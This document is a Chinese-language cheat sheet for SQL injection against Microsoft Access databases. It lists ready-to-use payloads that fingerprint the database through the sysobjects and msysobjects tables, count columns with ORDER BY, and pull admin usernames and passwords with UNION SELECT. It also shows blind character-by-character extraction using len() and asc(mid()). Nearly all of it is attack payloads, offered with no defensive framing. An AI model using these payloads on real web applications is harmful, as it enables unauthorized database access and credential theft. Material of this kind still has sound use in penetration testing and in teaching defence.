# ACCESS注入
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 判断数据库类型
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码查看:
```sql
    sysobjects 是SQL , msysobjects 是ACCESS,前提是允许访问系统表
    and (select count(*) from sysobjects)>0
    and (select count(*) from msysobjects)>0
    
    SQLServer: sysobjects页面正常，msysobject页面不正常
    ACCESS: sysobjects和加msysobjects的SQL语句后，网页显示都不正常
            msysobject后的网页显示正常

```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 联合查询法

```sql
    常规判断注入点，查询列数，Access只有一个库
    Order by NUM  代表查询的列名的数目有NUM个
    查表: UNION SELECT num,num+1... from admin
    查数据: UNION SELECT 1,admin,3,password from admin
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 逐字猜解法

```sql
    表名,列名可以搜索常见Access表列命名即可
    
    查表：and exists (select * from 表名)
    查列：and exists (select 列名 from 表名)
    查数据：1.确定长度 2.确定asc数据(asc编码)
           1.and (select top 1 len(列名) from admin)=5  //=换成<=5也成立，下同
           2.and (select top 1 asc(mid(列名,位数,1)) from admin)=97
```





